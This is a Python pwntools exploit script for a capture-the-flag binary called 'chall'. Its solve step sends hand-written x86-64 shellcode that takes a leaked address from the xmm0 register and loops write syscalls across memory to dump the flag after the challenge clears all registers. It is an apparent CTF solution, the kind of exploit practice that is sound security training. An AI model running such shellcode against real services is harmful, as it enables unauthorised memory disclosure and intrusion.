#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+186
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0x0000000000000000:  48 31 C0                xor       rax, rax
# 0x0000000000000003:  48 89 E7                mov       rdi, rsp
# 0x0000000000000006:  48 81 E7 00 F0 FF FF    and       rdi, 0xfffffffffffff000
# 0x000000000000000d:  48 81 EF 00 20 00 00    sub       rdi, 0x2000
# 0x0000000000000014:  48 C7 C1 00 06 00 00    mov       rcx, 0x600
# 0x000000000000001b:  F3 48 AB                rep stosq qword ptr [rdi], rax
# 0x000000000000001e:  48 31 DB                xor       rbx, rbx
# 0x0000000000000021:  48 31 C9                xor       rcx, rcx
# 0x0000000000000024:  48 31 D2                xor       rdx, rdx
# 0x0000000000000027:  48 31 E4                xor       rsp, rsp
# 0x000000000000002a:  48 31 ED                xor       rbp, rbp
# 0x000000000000002d:  48 31 F6                xor       rsi, rsi
# 0x0000000000000030:  48 31 FF                xor       rdi, rdi
# 0x0000000000000033:  4D 31 C0                xor       r8, r8
# 0x0000000000000036:  4D 31 C9                xor       r9, r9
# 0x0000000000000039:  4D 31 D2                xor       r10, r10
# 0x000000000000003c:  4D 31 DB                xor       r11, r11
# 0x000000000000003f:  4D 31 E4                xor       r12, r12
# 0x0000000000000042:  4D 31 ED                xor       r13, r13
# 0x0000000000000045:  4D 31 F6                xor       r14, r14
# 0x0000000000000048:  4D 31 FF                xor       r15, r15

def init():
    global io

    io = start()

def solve():

    sc = asm("""
        mov r9, 0xff0000000000
        movq r8, xmm0
        and r8, r9
        mov rdi, 0x1
        mov rsi, r8
        add rsi, 0x2060
        mov rdx, 0x100 
             
        do_write:
             mov rax, 0x1
             syscall
             
             cmp rax, 0
             je do_exit
             add rsi, 0x100000
             jmp do_write
            
        do_exit:
             mov rax, rax
             mov al, 0x3c
             xor rdi, rdi
             syscall
    """)

    
    io.send(sc)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

